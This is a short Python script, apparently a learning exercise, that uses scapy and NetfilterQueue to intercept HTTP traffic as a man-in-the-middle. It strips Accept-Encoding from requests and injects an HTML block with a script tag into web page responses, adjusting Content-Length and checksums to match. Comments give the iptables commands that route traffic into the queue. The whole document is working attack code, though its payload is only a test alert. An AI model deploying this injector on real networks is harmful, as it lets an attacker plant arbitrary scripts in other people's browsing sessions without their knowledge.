import scapy.all as scapy
from netfilterqueue import NetfilterQueue
import re


#we change the load to our package and we delete the len and chksum fields so scapy will recalculate them
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
   
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print "[+] Request"
	    # We remove the Accept-Encoding so we get the html in plain text format.
	    load = re.sub("Accept-Encoding:.*?\\r\\n", "",load)
        elif scapy_packet[scapy.TCP].sport == 80:
            print "[+] Responce"
            injection_code = "<div><h1>This code is injected<h1></div></p><script>alert('test');</script></body>"
            load = load.replace("</body>", injection_code+"</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
	    #If Content-Length and if this is a text/html and not an image for example execute the code below	
            if content_length_search and "text/html" in load:
		# we get the new content length adding the code we want to inject	
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
		# We create a new payload 
                load = load.replace(content_length, str(new_content_length))
        #if the new payload is different from the one we capture initially construct a new packet with our new payload.    
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()
    
queue = NetfilterQueue()
queue.bind(0, process_packet)#we bind to a queue this time is the 0 queue
#queues can be made using iptables like so: iptables -I FORWARD -j NFQUEUE --queue-num 0
#for testing at your own computer you will need the next two lines
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
queue.run()
